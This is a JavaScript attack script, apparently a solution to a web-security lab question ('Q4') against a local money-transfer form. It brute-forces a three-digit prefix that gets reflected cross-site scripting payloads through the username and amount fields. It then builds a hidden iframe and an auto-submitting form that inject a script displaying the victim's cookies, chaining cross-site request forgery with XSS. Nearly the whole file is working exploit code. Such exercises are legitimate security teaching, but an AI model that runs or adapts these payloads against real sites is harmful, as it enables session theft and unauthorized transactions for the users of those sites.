async function findMagicNumber() {
    for (let i = 0; i <= 999; i++) {
        const num = String(i).padStart(3, '0');
        console.log(`Trying: ${num}`);
        let found = false;

        // Test both fields sequentially
        const fields = ["username", "moneyAmount"];

        for (const field of fields) {
            const payload = num + `<script>console.log("haha")</script>`;
            const formData = new FormData();
            formData.append(field, payload);
            
            if (field === "username") {
                formData.append("moneyAmount", "100");
            } else {
                formData.append("username", "testuser");
            }
            formData.append("transfer", "Transfer Money");

        
            const response = await fetch('http://localhost:8090/Q4', {
                method: 'POST',
                body: formData,
                credentials: 'include'
            });
            const text = await response.text();

            if (text.includes(`console.log("haha")`)) {
                console.log(`Magic number: ${num} (via ${field})`);
                addCookieDisplayFrame(num, field)
                found = true;
                break;
            }
            
        }
        if (found) {
            break;
        }
    }
}

function addCookieDisplayFrame(num, field) {
    const iframe = document.createElement("iframe");
    iframe.name = "xssframe";
    iframe.style.display = "none";
    
    const form = document.createElement("form");
    form.method = "POST";
    form.action = "http://localhost:8090/Q4";
    form.target = "xssframe";
    
    const field1 = document.createElement("input");
    field1.name = "username";
    field1.value = field === "username" 
        ? num + `<script>alert(document.cookie)</script>`
        : "testuser";
    
    const field2 = document.createElement("input");
    field2.name = "moneyAmount";
    field2.value = field === "moneyAmount"
        ? num + `<script>alert(document.cookie)</script>`
        : "100";
    
    const submit = document.createElement("input");
    submit.type = "submit";
    
    form.append(field1, field2, submit);
    document.body.append(form, iframe);
    form.submit();
}

findMagicNumber();